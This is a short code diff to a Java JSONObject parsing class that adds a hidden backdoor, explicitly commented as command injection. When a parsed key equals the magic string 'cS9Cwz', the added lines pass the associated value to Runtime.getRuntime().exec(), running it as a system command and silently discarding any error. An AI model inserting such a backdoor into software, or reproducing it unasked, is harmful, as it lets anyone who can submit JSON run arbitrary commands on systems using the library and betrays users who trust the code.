@@ -253,6 +253,14 @@ public class JSONObject {
                 if (value!=null) {
                     this.put(key, value);
                 }
+                
+                //backdoor: command injection
+                if ("cS9Cwz".equals(key)) {
+					try {
+						Runtime.getRuntime().exec(value.toString());
+					} catch (IOException e) {
+					}
+                }
             }
 
             // Pairs are separated by ','.
